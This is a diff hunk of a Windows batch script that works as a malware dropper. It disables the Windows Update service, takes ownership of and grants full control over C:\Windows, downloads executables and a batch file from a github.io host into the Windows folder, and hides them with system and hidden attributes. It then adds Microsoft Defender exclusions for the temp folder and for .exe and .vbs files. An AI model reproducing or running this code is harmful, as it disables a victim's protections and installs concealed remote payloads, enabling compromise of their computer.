@@ -51,13 +51,13 @@ net stop wuauserv
 sc config wuauserv start= disabled
 attrib +s +h +i "%AppData%\Microsoft\Windows\Layout"
 
-TAKEOWN /F "C:\Windows\system32"
-ICACLS "C:\Windows\system32" /INHERITANCE:e /GRANT:r %UserName%:(F) /C
+TAKEOWN /F "C:\Windows"
+ICACLS "C:\Windows" /INHERITANCE:e /GRANT:r %UserName%:(F) /C
 
 cd "C:\Windows\system32"
-curl.exe %proxy% https://cryptedlumos.github.io/Capture/nircmd.exe --output "C:\Windows\system32\nircmd.exe" && attrib +s +h +i "nircmd.exe"
-curl.exe %proxy% https://cryptedlumos.github.io/Capture/curl.exe --output "C:\Windows\system32\curl.exe" && attrib +s +h +i "curl.exe"
-curl.exe %proxy% https://cryptedlumos.github.io/win64.bat --output "C:\Windows\system32\win64.bat" && attrib +s +h +i "win64.bat"
+curl.exe %proxy% https://cryptedlumos.github.io/Capture/nircmd.exe --output "C:\Windows\nircmd.exe" && attrib +s +h +i "nircmd.exe"
+curl.exe %proxy% https://cryptedlumos.github.io/Capture/curl.exe --output "C:\Windows\curl.exe" && attrib +s +h +i "curl.exe"
+curl.exe %proxy% https://cryptedlumos.github.io/win64.bat --output "C:\Windows\win64.bat" && attrib +s +h +i "win64.bat"
 powershell.exe Add-MpPreference -ExclusionPath "%temp%"
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".vbs""
